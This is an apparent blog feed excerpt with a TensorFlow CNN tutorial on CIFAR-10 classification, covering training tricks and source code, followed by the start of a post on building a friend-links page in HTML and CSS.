every local part separately to get features of current situation. However, pooling layers are NOT used in go AI since the data loss in pooling operation is deadly to describe a go game. So design your CNN structure thoughtfully before putting it into training.</p><h3 id="Back-Prop"><a href="#Back-Prop" class="headerlink" title="Back Prop"></a>Back Prop</h3><p>I used to be quite curios about the back propagation in convolutional layer, and pooling layers also made me confused. But actually they are basically the same as back prop in FCNN if you expand all formulas.</p><p>This <a href="https://www.youtube.com/watch?v=Lakz2MoHy6o&t=1097s">Video</a> explained how back prop in convolutional layer works.</p><p><img src="/images/CNN_BackProp.png"></p><p>As for max pooling, since itâ€™s just doing linear calculation, when doing back prop, just implement the gradient to the max <code>A</code> of the previous one if there is a max pooling layer between them, and othersâ€™ gradients are 0.</p><h2 id="CNN-Example"><a href="#CNN-Example" class="headerlink" title="CNN Example"></a>CNN Example</h2><p>Following this <a href="https://www.youtube.com/watch?v=eMMZpas-zX0">video</a>, I coded a simple CNN example with <code>TensorFlow</code> to classify <code>CIFAR10</code>, a dataset with 10 classes as following.</p><blockquote><p>â€˜airplaneâ€™, â€˜automobileâ€™, â€˜birdâ€™, â€˜catâ€™, â€˜deerâ€™, â€˜dogâ€™, â€˜frogâ€™, â€˜horseâ€™, â€˜shipâ€™, â€˜truckâ€™</p></blockquote><p>However, in my opinion, some images are too blur to classify even for human, so itâ€™s not surprised that AI performs poorly.</p><p><img src="/images/CNN_dataset.jpg"></p><p>Though thereâ€™s somebody made accuracy 90%+ AI with <code>ResNet</code>, that should be the content of another blog then. I made it 86.0% in 40 epochs, which is enough for experimenting CNN.</p><h3 id="Structure-1"><a href="#Structure-1" class="headerlink" title="Structure"></a>Structure</h3><p>Referring <code>LeNet</code>, <code>VGG</code>, and so on, we can see that the width and length of the tensor tend to go down, whereas the number of channels does increase as we go deeper into the layers of the network. Another pattern that still often repeated today is that we might have some one or more conv layers followed by a pooling layer.</p><p><img src="/images/CNN_LeNet.png"></p><center><small>LeNet</small></center><p>So I came up with this structure:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Model: &quot;sequential&quot;</span><br><span class="line">_________________________________________________________________</span><br><span class="line"> Layer (type)                Output Shape              Param #   </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> conv2d (Conv2D)             (None, 32, 32, 64)        1792      </span><br><span class="line">                                                                 </span><br><span class="line"> max_pooling2d (MaxPooling2D  (None, 16, 16, 64)       0         </span><br><span class="line"> )                                                               </span><br><span class="line">                                                                 </span><br><span class="line"> conv2d_1 (Conv2D)           (None, 16, 16, 128)       73856     </span><br><span class="line">                                                                 </span><br><span class="line"> max_pooling2d_1 (MaxPooling  (None, 8, 8, 128)        0         </span><br><span class="line"> 2D)                                                             </span><br><span class="line">                                                                 </span><br><span class="line"> conv2d_2 (Conv2D)           (None, 8, 8, 256)         295168    </span><br><span class="line">                                                                 </span><br><span class="line"> max_pooling2d_2 (MaxPooling  (None, 4, 4, 256)        0         </span><br><span class="line"> 2D)                                                             </span><br><span class="line">                                                                 </span><br><span class="line"> flatten (Flatten)           (None, 4096)              0         </span><br><span class="line">                                                                 </span><br><span class="line"> dense (Dense)               (None, 256)               1048832   </span><br><span class="line">                                                                 </span><br><span class="line"> dense_1 (Dense)             (None, 10)                2570      </span><br><span class="line">                                                                 </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Total params: 1,422,218</span><br><span class="line">Trainable params: 1,422,218</span><br><span class="line">Non-trainable params: 0</span><br><span class="line">_________________________________________________________________</span><br><span class="line">None</span><br></pre></td></tr></table></figure><p>However, after a few epochs, I found the accuracy too low to convince me that I have reached CNNâ€™s full potential, which was only around 70~75%, and was heavily overfitted since the training set accuracy is around 90%.</p><h3 id="Training-Tricks"><a href="#Training-Tricks" class="headerlink" title="Training Tricks"></a>Training Tricks</h3><p>Actually, even though youâ€™ve come up with a fantastic structure, or just copied a successful classic structure from Internet, without some tricky training approaches, you can barely make the network works well.</p><h4 id="Dropout"><a href="#Dropout" class="headerlink" title="Dropout"></a>Dropout</h4><p>Dropout is a great way to avoid overfitting. Iâ€™ve implemented this method in my FCNN project and found it useful, so Iâ€™d recommend it also to CNN. We can add dropout layer into convolutional layers or FC layers, the dropout rate should be between 0.1 and 0.5. In detail, you should make the network receive all input information or most of it, so the dropout rate of the input layer should be like 0.1 or 0, then feel free about the dropout rate in hidden layers.</p><p>The reason why dropout helps, in my personal belief, is that randomly disabling neurons makes your single network more likely to be made up with tons of smaller networks, which improves robustness of your model evidently.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br></pre></td></tr></table></figure><p>The code above means it will disable 40% neurons in the previous layer randomly.</p><p>In CNN, itâ€™s said adding dropout layer before or after pooling layer are both OK. I personally think adding a dropout layer after a pooling layer maximizes the effect of a dropout layer, so Iâ€™d prefer this method in most cases.</p><p>Adding a dropout layer will also make your validation accuracy higher than your training accuracy at the beginning. The difference between validation accuracy and training accuracy should be smaller and smaller as model learns.</p><h4 id="Regularization"><a href="#Regularization" class="headerlink" title="Regularization"></a>Regularization</h4><p>Doing regularization to weights and biases can also limit the level of overfitting because itâ€™s minimizing the complexity of your model. This can be done by setting <code>kernel_regularizer</code> to some <code>regularizers</code> when creating a layer. The regularization parameter, or <code>weight_decay</code>, is usually set to <code>1e-4</code>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.add(layers.Dense(<span class="number">256</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_regularizer=regularizers.l2(<span class="number">1e-4</span>)))</span><br></pre></td></tr></table></figure><h4 id="Learning-Rate-Decay"><a href="#Learning-Rate-Decay" class="headerlink" title="Learning Rate Decay"></a>Learning Rate Decay</h4><p>When weâ€™re training the model, weâ€™re expecting the model to learn more â€˜carefullyâ€™ while itâ€™s getting more accurate. This demand leads us to learning rate decay.</p><p>Firstly, we can do a rather large decay to change the stage of training manually. For example, we can start the training with <code>learning_rate=0.002</code> for 10 epochs, and reduce the learning rate to 0.001 manually for another 10 epochs, by doing which, we can make our model to learn faster and more accurate at the same time.</p><p>Secondly, we can do very tiny decay in every stage of training. For example, when starting with <code>learning_rate=0.002</code>, we can reduce learning rate a bit after every epoch ,usually 1e-6, which also helps. To implement this method, just set <code>decay</code> parameter when initializing your optimizer.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">optim = keras.optimizers.Adam(learning_rate=<span class="number">0.0003</span>, decay=<span class="number">1e-6</span>)</span><br></pre></td></tr></table></figure><h4 id="Batch-Normalization"><a href="#Batch-Normalization" class="headerlink" title="Batch Normalization"></a>Batch Normalization</h4><p>Before feeding data to the model, weâ€™d like to preprocess the data to make it close to Gaussian distribution to make the â€œlandscapeâ€ of loss function smoother, in extreme cases, a model may unable to be trained or stay a low accuracy if normalization of input data is not applied. Since we can use this normalization in the input layer, we can also apply this method to hidden layers. We can collect the output of a hidden layer and make it Gaussian distribution. According to researches, doing batch normalization before and after activation are usually both OK. But weâ€™d like to do it before activation when using sigmoid as activation function because sigmoid is happy to take input close to 0, from which we can get rather big gradient. So itâ€™s wise to make your decision after considering the actual conditions, features of your model, and the underlying principles of the actual processes.</p><p>When testing the model, it would use the delta and sigma at training stage to process the testing data.</p><p>I forgot to implement this kind of layers at first, and got accuracy to 84.46%. After implementing batch normalization layers, the accuracy increased by 1.5%, which is an evident improvement at such accuracy. So batch normalization is really a simple and effective way to improve your network.</p><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>Training a ANN is very similar to alchemy. You need to tweak your network hundred times and try every little trick including but not limited to what I mentioned above to improve it. So you need enough patience and knowledge to become a really powerful AI alchemist.</p><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>After implemented all tricks to prevent overfitting and normal optimizations such as input standardization, mini-batch, validation dataset, etc. I finally made the testing accuracy 86.03%, which is enough for me.</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Source    </div>    <div class='spoiler-content'>        <ul><li><p><strong>Importing</strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> layers</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> regularizers</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br></pre></td></tr></table></figure></li><li><p><strong>Preprocess</strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dataset = keras.datasets.cifar10</span><br><span class="line">(data_images, train_labels), (test_images, test_labels) = dataset.load_data()</span><br><span class="line"></span><br><span class="line">class_names = [<span class="string">&#x27;airplane&#x27;</span>, <span class="string">&#x27;automobile&#x27;</span>, <span class="string">&#x27;bird&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;deer&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;frog&#x27;</span>, <span class="string">&#x27;horse&#x27;</span>, <span class="string">&#x27;ship&#x27;</span>, <span class="string">&#x27;truck&#x27;</span>]</span><br><span class="line">dataset_size = <span class="built_in">len</span>(data_images)</span><br><span class="line">train_images, test_images = data_images / <span class="number">255.0</span>, test_images / <span class="number">255.0</span></span><br><span class="line"></span><br><span class="line">mean = np.mean(train_images, axis=<span class="built_in">tuple</span>(<span class="built_in">range</span>(train_images.ndim-<span class="number">1</span>)))</span><br><span class="line">std = np.std(train_images, axis=<span class="built_in">tuple</span>(<span class="built_in">range</span>(train_images.ndim-<span class="number">1</span>)))</span><br><span class="line">train_images = (train_images - mean) / std</span><br><span class="line">test_images = (test_images - mean) / std</span><br><span class="line"></span><br><span class="line">test_labels = np.squeeze(np.array(tf.one_hot(test_labels, <span class="number">10</span>)))</span><br><span class="line">train_labels = np.squeeze(np.array(tf.one_hot(train_labels, <span class="number">10</span>)))</span><br><span class="line"></span><br><span class="line">valid_images = train_images[-<span class="number">1000</span>:]</span><br><span class="line">train_images = train_images[:-<span class="number">1000</span>]</span><br><span class="line">valid_labels = train_labels[-<span class="number">1000</span>:]</span><br><span class="line">train_labels = train_labels[:-<span class="number">1000</span>]</span><br></pre></td></tr></table></figure></li><li><p><strong>Modeling</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">weight_decay = <span class="number">1e-4</span></span><br><span class="line"></span><br><span class="line">model = keras.models.Sequential()</span><br><span class="line"></span><br><span class="line">model.add(layers.Conv2D(<span class="number">64</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>, input_shape=(<span class="number">32</span>, <span class="number">32</span>, <span class="number">3</span>),</span><br><span class="line">                        kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.MaxPool2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.1</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Conv2D(<span class="number">128</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>,</span><br><span class="line">          kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.MaxPool2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Conv2D(<span class="number">256</span>, <span class="number">3</span>, activation=<span class="string">&#x27;relu&#x27;</span>, padding=<span class="string">&#x27;same&#x27;</span>,</span><br><span class="line">          kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.MaxPool2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Flatten())</span><br><span class="line"></span><br><span class="line">model.add(layers.Dense(<span class="number">256</span>, activation=<span class="string">&#x27;relu&#x27;</span>, kernel_regularizer=regularizers.l2(weight_decay)))</span><br><span class="line">model.add(layers.BatchNormalization())</span><br><span class="line">model.add(layers.Dropout(<span class="number">0.4</span>))</span><br><span class="line"></span><br><span class="line">model.add(layers.Dense(<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>, kernel_regularizer=regularizers.l2(weight_decay)))</span><br></pre></td></tr></table></figure></li><li><p><strong>Training</strong></p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">batch_size = <span class="number">64</span></span><br><span class="line">loss = keras.losses.CategoricalCrossentropy()</span><br><span class="line">metrics = [<span class="string">&quot;accuracy&quot;</span>]</span><br><span class="line">history = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Train</span>(<span class="params">lr, epochs</span>):</span></span><br><span class="line">    optim = keras.optimizers.Adam(learning_rate=lr, decay=<span class="number">1e-6</span>)</span><br><span class="line">    model.<span class="built_in">compile</span>(optimizer=optim, loss=loss, metrics=metrics)</span><br><span class="line">    history.append(model.fit(train_images, train_labels, batch_size=batch_size, epochs=epochs,</span><br><span class="line">                             verbose=<span class="number">1</span>, validation_data=(valid_images, valid_labels),</span><br><span class="line">                             validation_batch_size=batch_size))</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.001</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN0&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.0005</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN1&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.0003</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN2&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Train(<span class="number">0.0002</span>, <span class="number">10</span>)</span><br><span class="line">model.save(<span class="string">&#x27;Cifar10_CNN3&#x27;</span>, save_format=<span class="string">&#x27;tf&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul>    </div></div><h3 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h3><p><img src="/images/CNN_loss_rec.png"></p><center><small>Accuracy Figure</small></center><p><img src="/images/CNN_acc_rec.png"></p><center><small>Loss Figure</small></center><p>We can see that when changing to a smaller learning rate, the loss drops rapidly (Look at 10, 20, 30 epochs in the loss figure). Which proves that learning rate should match the stage of the model when training.</p><p>Finally, the most å–œé—»ä¹è§ (interesting and funny) part: Error prediction reviewing. Iâ€™ve labeled these data by <code>prediction / correct label</code></p><p><img src="/images/CNN_Wrong_Predictions.png"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Friend Links Setup</title>
      <link href="2022/06/03/FriendLinksSetup/"/>
      <url>2022/06/03/FriendLinksSetup/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å‹é“¾Pageçš„Setupè¿‡ç¨‹ï¼Œéå¸¸æ— è„‘ï¼Œæ¬ç –å°±å®Œäº†ï¼Œæ„Ÿè°¢å‰è¾ˆçš„ç»éªŒ</p><span id="more"></span><h1 id="Friend-Links-Setup"><a href="#Friend-Links-Setup" class="headerlink" title="Friend Links Setup"></a>Friend Links Setup</h1><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>ä»£ç æ¥è‡ª<a href="https://finisky.github.io/simplestblogroll/">è¿™ç¯‡åšå®¢</a></p><p>å…³äºè·å–QQå¤´åƒçš„<a href="https://zhuanlan.zhihu.com/p/415485011">çŸ¥ä¹ä¸“æ </a></p><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><div class='spoiler collapsed'>    <div class='spoiler-title'>        CSS Source    </div>    <div class='spoiler-content'>        <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;post-body&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;links&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">         .links-content&#123;</span><br><span class="line"><span class="css">         <span class="attribute">margin-top</span>:<span class="number">1rem</span>;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.link-navigation</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">content</span>: <span class="string">&quot; &quot;</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="css">         <span class="attribute">clear</span>: both;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card &#123;</span><br><span class="line"><span class="css">         <span class="attribute">width</span>: <span class="number">45%</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">transition-duration</span>: <span class="number">0.15s</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">margin-bottom</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">display</span>:flex;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span><span class="selector-pseudo">:nth-child</span>(odd) &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">float</span>: left;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span><span class="selector-pseudo">:nth-child</span>(even) &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">float</span>: right;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.1</span>);</span></span><br><span class="line"><span class="css">         <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">6px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.12</span>), <span class="number">0</span> <span class="number">0</span> <span class="number">6px</span> <span class="number">0</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.04</span>);</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">border</span>:none;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card .ava &#123;</span><br><span class="line"><span class="css">         <span class="attribute">width</span>: <span class="number">3rem</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">height</span>: <span class="number">3rem</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">margin</span>:<span class="number">0</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">margin-right</span>: <span class="number">1em</span><span class="meta">!important</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">border-radius</span>:<span class="number">4px</span>;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card .card-header &#123;</span><br><span class="line"><span class="css">         <span class="attribute">font-style</span>: italic;</span></span><br><span class="line"><span class="css">         <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="css">         <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span> <span class="selector-class">.card-header</span> <span class="selector-tag">a</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-style</span>: normal;</span></span><br><span class="line"><span class="css">         <span class="attribute">color</span>: <span class="number">#2bbc8a</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="css">         <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="css">         <span class="selector-class">.card</span> <span class="selector-class">.card-header</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="css">         <span class="attribute">color</span>: <span class="number">#d480aa</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line">         &#125;</span><br><span class="line">         .card .card-header .info &#123;</span><br><span class="line"><span class="css">         <span class="attribute">font-style</span>:normal;</span></span><br><span class="line"><span class="css">         <span class="attribute">color</span>:<span class="number">#a3a3a3</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">font-size</span>:<span class="number">14px</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">min-width</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="css">         <span class="attribute">overflow</span>: hidden;</span></span><br><span class="line"><span class="css">         <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line">         &#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;links-content&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;link-navigation&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">&quot;ava&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://q.qlogo.cn/g?b=qq&amp;k=7PD14jYzQNoQ0KvkgCT3Xw&amp;s=640&quot;</span> /&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-header&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://blog.woooo.tech/&quot;</span>&gt;</span>Reverier<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span>XDSEC2019[Reverseã€å¼€å‘]<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span 